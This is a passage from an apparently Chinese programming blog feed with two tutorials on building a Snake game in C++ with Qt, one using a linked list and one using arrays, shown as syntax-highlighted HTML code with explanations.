class="title">Widget::checkisEatSelf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(linkedlist-&gt;first())&#123;</span><br><span class="line">        Linkedlist::SnakeNode *p0=linkedlist-&gt;first()-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(p0)&#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">//判断蛇头坐标是否等于蛇身某个节点坐标</span></span><br><span class="line">            <span class="keyword">if</span>(linkedlist-&gt;first()-&gt;pos==p0-&gt;pos)&#123;</span><br><span class="line">                qDebug()&lt;&lt;<span class="string">"吃到自己!游戏结束"</span>;</span><br><span class="line">                m_timerControl-&gt;<span class="built_in">stop</span>();</span><br><span class="line">                QMessageBox::critical(<span class="keyword">this</span>,<span class="string">"game over"</span>,<span class="string">"game over"</span>);</span><br><span class="line">                <span class="keyword">this</span>-&gt;<span class="built_in">close</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p0=p0-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">while</span> (p0);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::checkisEatFood</span></span><br><span class="line"><span class="comment">/// 检测是否吃到食物</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::checkisEatFood</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(linkedlist-&gt;first()-&gt;pos.x()==m_foodPos.x()&amp;&amp;</span><br><span class="line">            linkedlist-&gt;first()-&gt;pos.y()==m_foodPos.y())&#123;</span><br><span class="line">        qDebug()&lt;&lt;<span class="string">"吃到食物！"</span>;</span><br><span class="line">        m_eatfoodCount++;</span><br><span class="line">        m_score+=<span class="number">20</span>;</span><br><span class="line">        leScore-&gt;setText(QString::number(m_score)+<span class="string">" 分"</span>);</span><br><span class="line">        <span class="keyword">if</span>(m_score&gt;=<span class="number">100</span>)&#123;</span><br><span class="line">            m_speed=<span class="number">80</span>;</span><br><span class="line">            m_timerControl-&gt;setInterval(m_speed);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//随便设置的x y 坐标</span></span><br><span class="line">        QPoint pos=QPoint();</span><br><span class="line">        linkedlist-&gt;append(pos);</span><br><span class="line">        <span class="comment">//重新设置食物坐标</span></span><br><span class="line">        resetFoodPos();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::checkisHitWall</span></span><br><span class="line"><span class="comment">/// 检测是否撞到墙</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::checkisHitWall</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(linkedlist-&gt;first()-&gt;pos.x()&lt;<span class="number">0</span>||linkedlist-&gt;first()-&gt;pos.y()&lt;<span class="number">0</span>||</span><br><span class="line">            linkedlist-&gt;first()-&gt;pos.x()&gt;COLUMN<span class="number">-1</span>||linkedlist-&gt;first()-&gt;pos.y()&gt;ROW<span class="number">-1</span>)&#123;</span><br><span class="line">        m_timerControl-&gt;<span class="built_in">stop</span>();</span><br><span class="line">        qDebug()&lt;&lt;<span class="string">"撞到墙壁！游戏结束！"</span>;</span><br><span class="line">        QMessageBox::critical(<span class="keyword">this</span>,<span class="string">"game over"</span>,<span class="string">"game over!"</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;<span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::timeOut</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    checkisEatFood();</span><br><span class="line">    <span class="comment">//打印出蛇身节点坐标</span></span><br><span class="line">    linkedlist-&gt;printLinkedlist();</span><br><span class="line">    <span class="comment">//蛇身移动</span></span><br><span class="line">    <span class="keyword">if</span>(linkedlist-&gt;first())&#123;</span><br><span class="line">        Linkedlist::SnakeNode *p0=linkedlist-&gt;last();</span><br><span class="line">        <span class="keyword">if</span>(linkedlist-&gt;getLength()!=<span class="number">1</span>&amp;&amp;p0)&#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">//把前一个节点的坐标赋值给当前节点 ，即蛇向前移动一格</span></span><br><span class="line">                p0-&gt;pos=p0-&gt;prev-&gt;pos;</span><br><span class="line">                <span class="comment">//指向前一个节点</span></span><br><span class="line">                p0=p0-&gt;prev;</span><br><span class="line">                <span class="comment">//因为 头结点的前一个节点为NULL</span></span><br><span class="line">                <span class="comment">//所以这里必须 p0!= linkedlist-&gt;first()</span></span><br><span class="line">            &#125; <span class="keyword">while</span> (p0!=linkedlist-&gt;first());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//蛇运动</span></span><br><span class="line">    snakeRunning();</span><br><span class="line">    checkisHitWall();</span><br><span class="line">    checkisEatSelf();</span><br><span class="line">    <span class="comment">//更新绘图</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;update();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::startGame</span></span><br><span class="line"><span class="comment">/// 开始游戏</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::startGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_timerControl-&gt;start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::stopGame</span></span><br><span class="line"><span class="comment">/// 结束游戏</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::stopGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_timerControl-&gt;<span class="built_in">stop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::snakeRunning</span></span><br><span class="line"><span class="comment">/// 蛇运动</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::snakeRunning</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=linkedlist-&gt;first()-&gt;pos.x();</span><br><span class="line">    <span class="keyword">int</span> y=linkedlist-&gt;first()-&gt;pos.y();</span><br><span class="line">    <span class="comment">//判断方向</span></span><br><span class="line">    <span class="keyword">switch</span> (m_direction) &#123;</span><br><span class="line">    <span class="keyword">case</span> Up:</span><br><span class="line">        linkedlist-&gt;first()-&gt;pos.setY(y-=<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Down:</span><br><span class="line">        linkedlist-&gt;first()-&gt;pos.setY(y+=<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Left:</span><br><span class="line">        linkedlist-&gt;first()-&gt;pos.setX(x-=<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> Right:</span><br><span class="line">        linkedlist-&gt;first()-&gt;pos.setX(x+=<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Widget::checkFoodPosisEqualHeadPos</span></span><br><span class="line"><span class="comment">/// \param head</span></span><br><span class="line"><span class="comment">/// \param foodPos</span></span><br><span class="line"><span class="comment">/// 检测食物出现坐标是否在蛇身上</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::checkFoodPosisEqualHeadPos</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(linkedlist-&gt;first())&#123;</span><br><span class="line">        Linkedlist::SnakeNode *p0=linkedlist-&gt;first();</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(p0-&gt;pos==m_foodPos)&#123;</span><br><span class="line">                qDebug()&lt;&lt;<span class="string">"检测到食物处于蛇身上..."</span>;</span><br><span class="line">                resetFoodPos();</span><br><span class="line">            &#125;</span><br><span class="line">            p0=p0-&gt;next;</span><br><span class="line">        &#125; <span class="keyword">while</span> (p0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试<br><img src="/uploads/images/snake/snake2.gif" alt="img"></p>
<p>Bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt实现贪吃蛇1:数组实现</title>
    <url>/cpp-snake1/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近刚学了链表这一方面的内容，感觉挺强大的，正巧想起以前用数组写过一个贪吃蛇游戏代码，于是打算用两种方法实现它。方法为以下两种：</p>
<ul>
<li>数组</li>
<li>链表</li>
</ul>
<a id="more"></a>



<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>其实，用数组实现贪吃蛇还算是比较简单的了，为什么？因为不用花太大功夫去考虑蛇身的每个节点之间的关系。同样，在实现蛇的游动、吃食、撞墙、吃到自己等功能时，最核心的部分我觉得是要弄清。</p>
<ul>
<li>其中 <code>void paintEvent(QPaintEvent *event)</code> 用来在每次重绘时绘制游戏布局、食物的位置、蛇的位置。分别用两个数组表示 <strong>食物的位置、蛇的位置</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> food[<span class="number">2</span>];<span class="comment">// food[0]表示 x坐标，food[1]表示 y坐标 </span></span><br><span class="line"><span class="keyword">int</span> snake[<span class="number">100</span>][<span class="number">2</span>]; <span class="comment">//同理，不过这里100相当于最多有100个蛇节点</span></span><br></pre></td></tr></table></figure>

<ul>
<li>接着，<code>void keyPressEvent(QKeyEvent * event)</code> 事件用来改变蛇运动的方向。我添加了一个枚举值</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span>  Direction:<span class="keyword">int</span></span><br><span class="line">&#123;</span><br><span class="line">    East,</span><br><span class="line">    South,</span><br><span class="line">    West,</span><br><span class="line">    North</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>由于蛇是自己移动的，所以还是创建一个时钟 <code>QTimer</code> 对象。</li>
<li>那么怎么判断蛇是否吃到食物呢，这里其实很简单，可以<strong>判断蛇头的x,y坐标是否与食物的x,y坐标相等即可</strong>，即<code>if(snake[0][0]==food[0]&amp;&amp;snake[0][1]==food[1]){...}</code></li>
<li>所以，检测是否撞到墙，也可以这样判断蛇头是否超过了边界 <code>if((snake[0][0]&lt;0||snake[0][1]&lt;0||snake[0][0]&gt;Columns-1||snake[0][1]&gt;Rows-1)){ ... }</code></li>
<li>检测蛇是否吃到自己，可以 <strong>遍历每个蛇节点，判断蛇头 snake[0] 是否等于 某一个蛇身节点 snake[n] 即：蛇头在蛇的身上，表示吃到自己</strong></li>
</ul>
<p>好了，有了这些思路，那么就可以开始写代码了，可以创建一个Qt widget项目。<br>代码如下：</p>
<p>dialog.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DIALOG_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIALOG_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDialog&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPalette&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QLabel&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPainter&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QKeyEvent&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QTimer&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QTime&gt;</span></span></span><br><span class="line"><span class="keyword">namespace</span> Ui &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dialog</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dialog</span> :</span> <span class="keyword">public</span> QDialog</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timeOut</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">btnStartslot</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">btnPauseslot</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">keyPressEvent</span><span class="params">(QKeyEvent *)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">paintEvent</span><span class="params">(QPaintEvent *event)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Dialog</span><span class="params">(QWidget *parent = <span class="number">0</span>)</span></span>;</span><br><span class="line">    ~Dialog();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">initialized</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">snakeRun</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">checkHItWall</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">checkEatSelf</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">enum</span>  Direction:<span class="keyword">int</span>&#123;</span><br><span class="line">        East,</span><br><span class="line">        South,</span><br><span class="line">        West,</span><br><span class="line">        North</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> food[<span class="number">2</span>];<span class="comment">//食物坐标</span></span><br><span class="line">    <span class="keyword">int</span> snake[<span class="number">100</span>][<span class="number">2</span>];<span class="comment">//蛇坐标</span></span><br><span class="line">    <span class="keyword">int</span> eatfoodCount;<span class="comment">//吃到的食物总数</span></span><br><span class="line">    <span class="keyword">int</span> directtion;<span class="comment">//蛇头方向</span></span><br><span class="line">    <span class="keyword">int</span> scores;<span class="comment">//得分</span></span><br><span class="line">    <span class="keyword">int</span> speed;<span class="comment">//蛇移动速度</span></span><br><span class="line">    QLabel *lbScroe;</span><br><span class="line">    QTimer *timer;</span><br><span class="line">    Ui::Dialog *ui;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// DIALOG_H</span></span></span><br></pre></td></tr></table></figure>

<p>dialog.cpp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"dialog.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ui_dialog.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QMessageBox&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Columns 20 <span class="comment">//20列</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Rows 20  <span class="comment">//20行</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::timeOut</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    snakeRun();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::btnStartslot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    timer-&gt;start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::btnPauseslot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    timer-&gt;<span class="built_in">stop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::keyPressEvent</span><span class="params">(QKeyEvent * event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(event-&gt;key()==<span class="string">'A'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(directtion!=West)&#123;</span><br><span class="line">                 directtion=East;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(event-&gt;key()==<span class="string">'D'</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(directtion!=East)&#123;</span><br><span class="line">                directtion=West;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(event-&gt;key()==<span class="string">'W'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(directtion!=South)&#123;</span><br><span class="line">                directtion=North;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(event-&gt;key()==<span class="string">'S'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(directtion!=North)&#123;</span><br><span class="line">                directtion=South;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Dialog::paintEvent</span></span><br><span class="line"><span class="comment">/// \param event</span></span><br><span class="line"><span class="comment">/// 绘图事件主要负责 绘制 蛇</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::paintEvent</span><span class="params">(QPaintEvent *event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">QPainter <span class="title">painter</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">    QPen pen;</span><br><span class="line">    pen.setColor(QColor(Qt::darkGray));</span><br><span class="line">    painter.setPen(pen);</span><br><span class="line">    <span class="comment">//绘制游戏布局</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> row = <span class="number">0</span>; row &lt; Rows; ++row) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> column = <span class="number">0</span>; column &lt; Columns; ++column) &#123;</span><br><span class="line">            painter.drawRect(row*<span class="number">20</span>,column*<span class="number">20</span>,<span class="number">20</span>,<span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//绘制食物</span></span><br><span class="line">    painter.fillRect(food[<span class="number">0</span>]*<span class="number">20</span>,food[<span class="number">1</span>]*<span class="number">20</span>,<span class="number">20</span>,<span class="number">20</span>,Qt::red);</span><br><span class="line">    <span class="comment">//绘制蛇头</span></span><br><span class="line">    painter.fillRect(snake[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">20</span>,snake[<span class="number">0</span>][<span class="number">1</span>]*<span class="number">20</span>,<span class="number">20</span>,<span class="number">20</span>,Qt::green);</span><br><span class="line">    <span class="comment">//根据食物的多少来绘制蛇身大长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> snakeBody = <span class="number">1</span>; snakeBody &lt;= eatfoodCount; snakeBody++) &#123;</span><br><span class="line">        painter.fillRect(snake[snakeBody][<span class="number">0</span>]*<span class="number">20</span>,snake[snakeBody][<span class="number">1</span>]*<span class="number">20</span>,<span class="number">20</span>,<span class="number">20</span>,QColor(<span class="number">0</span>,<span class="number">100</span>,<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Dialog::Dialog(QWidget *parent) :</span><br><span class="line">    QDialog(parent),</span><br><span class="line">    ui(<span class="keyword">new</span> Ui::Dialog)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//设置随机数</span></span><br><span class="line">    QTime t=QTime::currentTime();</span><br><span class="line">    <span class="keyword">int</span> s=  t.secsTo(QTime(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">     qsrand(s);</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">     initialized();</span><br><span class="line">    QPushButton *btnStart=<span class="keyword">new</span> QPushButton(<span class="keyword">this</span>);</span><br><span class="line">    btnStart-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line">    btnStart-&gt;setText(<span class="string">"start ..."</span>);</span><br><span class="line">    btnStart-&gt;setGeometry(<span class="number">500</span>,<span class="number">100</span>,<span class="number">250</span>,<span class="number">50</span>);</span><br><span class="line">    QPushButton *btnPause=<span class="keyword">new</span> QPushButton(<span class="keyword">this</span>);</span><br><span class="line">    btnPause-&gt;setFlat(<span class="literal">true</span>);</span><br><span class="line">    btnPause-&gt;setText(<span class="string">"pause ..."</span>);</span><br><span class="line">    btnPause-&gt;setGeometry(<span class="number">500</span>,<span class="number">180</span>,<span class="number">250</span>,<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">connect</span>(btnStart,SIGNAL(clicked(<span class="keyword">bool</span>)),<span class="keyword">this</span>,SLOT(btnStartslot()));</span><br><span class="line">    <span class="built_in">connect</span>(btnPause,SIGNAL(clicked(<span class="keyword">bool</span>)),<span class="keyword">this</span>,SLOT(btnPauseslot()));</span><br><span class="line">    QLabel *lbshowScroe=<span class="keyword">new</span> QLabel(<span class="keyword">this</span>);</span><br><span class="line">    lbScroe=<span class="keyword">new</span> QLabel(<span class="keyword">this</span>);</span><br><span class="line">    lbshowScroe-&gt;setText(<span class="string">"得分："</span>);</span><br><span class="line">    lbScroe-&gt;setText(QString::number(scores));</span><br><span class="line">    lbshowScroe-&gt;setGeometry(<span class="number">500</span>,<span class="number">50</span>,<span class="number">100</span>,<span class="number">50</span>);</span><br><span class="line">    lbScroe-&gt;setGeometry(<span class="number">600</span>,<span class="number">50</span>,<span class="number">100</span>,<span class="number">50</span>);</span><br><span class="line">    <span class="keyword">this</span>-&gt;setFixedSize(<span class="number">800</span>,<span class="number">460</span>);</span><br><span class="line">    <span class="keyword">this</span>-&gt;setWindowTitle(<span class="string">"贪吃蛇"</span>);</span><br><span class="line">    <span class="comment">//设置时钟</span></span><br><span class="line">    timer=<span class="keyword">new</span> QTimer(<span class="keyword">this</span>);</span><br><span class="line">    timer-&gt;setInterval(speed);</span><br><span class="line">    <span class="built_in">connect</span>(timer,SIGNAL(timeout()),<span class="keyword">this</span>,SLOT(timeOut()));</span><br><span class="line">&#125;</span><br><span class="line">Dialog::~Dialog()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::initialized</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    eatfoodCount=<span class="number">0</span>;</span><br><span class="line">    scores=<span class="number">0</span>;</span><br><span class="line">    speed=<span class="number">200</span>;</span><br><span class="line">    <span class="comment">//初始化食物坐标</span></span><br><span class="line">    food[<span class="number">0</span>]=qrand()%Columns;</span><br><span class="line">    food [<span class="number">1</span>]= qrand()%Rows;</span><br><span class="line">    <span class="comment">//初始化蛇头坐标</span></span><br><span class="line">    snake[<span class="number">0</span>][<span class="number">0</span>]=qrand()%Columns;</span><br><span class="line">    snake[<span class="number">0</span>][<span class="number">1</span>]=qrand()%Rows;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; eatfoodCount; ++i) &#123;</span><br><span class="line">        <span class="comment">//判断食物是否出现在蛇的身上</span></span><br><span class="line">        <span class="keyword">if</span>(food[<span class="number">0</span>]==snake[i][<span class="number">0</span>]&amp;&amp;food[<span class="number">1</span>]==snake[i][<span class="number">1</span>])&#123;</span><br><span class="line">            qDebug()&lt;&lt;<span class="string">"the food position is at snake ..."</span>;</span><br><span class="line">            snake[<span class="number">0</span>][<span class="number">0</span>]=qrand()%Columns;</span><br><span class="line">            snake[<span class="number">0</span>][<span class="number">1</span>]=qrand()%Rows;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化蛇头方向</span></span><br><span class="line">    directtion=qrand()%<span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Dialog::snakeRun</span></span><br><span class="line"><span class="comment">/// 蛇移动</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::snakeRun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//打印出蛇的每个节点坐标，用于测试</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; eatfoodCount; ++i) &#123;</span><br><span class="line">        qDebug()&lt;&lt;QString(<span class="string">"%1 : (%2-%3)"</span>).arg(i).arg(snake[i][<span class="number">0</span>]).arg(snake[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    qDebug()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//吃到食物，即 食物 food x,y坐标 等于 蛇头snake[0] x，y坐标</span></span><br><span class="line">    <span class="keyword">if</span>(snake[<span class="number">0</span>][<span class="number">0</span>]==food[<span class="number">0</span>]&amp;&amp;snake[<span class="number">0</span>][<span class="number">1</span>]==food[<span class="number">1</span>])&#123;</span><br><span class="line">        scores+=<span class="number">20</span>; <span class="comment">//得分</span></span><br><span class="line">        qDebug()&lt;&lt;<span class="string">"eat the food"</span>;</span><br><span class="line">        eatfoodCount++;<span class="comment">//食物个数++</span></span><br><span class="line">        lbScroe-&gt;setText(QString::number(scores));</span><br><span class="line">        <span class="comment">//产生新的食物位置</span></span><br><span class="line">        food[<span class="number">0</span>]=qrand()%Columns;</span><br><span class="line">        food [<span class="number">1</span>]= qrand()%Rows;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//变换速度</span></span><br><span class="line">    <span class="keyword">if</span>(scores&gt;= <span class="number">50</span>)&#123;</span><br><span class="line">        speed=<span class="number">100</span>;</span><br><span class="line">        timer-&gt;setInterval(speed);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(scores&gt;=<span class="number">100</span>)&#123;</span><br><span class="line">        speed=<span class="number">50</span>;</span><br><span class="line">        timer-&gt;setInterval(speed);</span><br><span class="line">    &#125;</span><br><span class="line">    checkHItWall();</span><br><span class="line">    checkEatSelf();</span><br><span class="line">    <span class="comment">//蛇头向前移动一格后，蛇头坐标变了，</span></span><br><span class="line">    <span class="comment">//原蛇头的坐标为第一节身体的坐标，</span></span><br><span class="line">    <span class="comment">//原第一节身体坐标为现在第二节的坐标，即所有坐标向前移动一格</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i =  eatfoodCount; i &gt;<span class="number">0</span>; i--) &#123;</span><br><span class="line">        snake[i][<span class="number">0</span>]=snake[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        snake[i][<span class="number">1</span>]=snake[i<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据方向来移动蛇</span></span><br><span class="line">    <span class="keyword">switch</span> (directtion) &#123;</span><br><span class="line">    <span class="keyword">case</span> East:</span><br><span class="line">        snake[<span class="number">0</span>][<span class="number">0</span>]--;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> South:</span><br><span class="line">        snake[<span class="number">0</span>][<span class="number">1</span>]++;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> West:</span><br><span class="line">        snake[<span class="number">0</span>][<span class="number">0</span>]++;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> North:</span><br><span class="line">        snake[<span class="number">0</span>][<span class="number">1</span>]--;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/// 更新绘图</span></span><br><span class="line">    update();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Dialog::checkHItWall</span></span><br><span class="line"><span class="comment">/// 是否撞墙</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::checkHItWall</span><span class="params">()</span></span></span><br><span class="line"><span 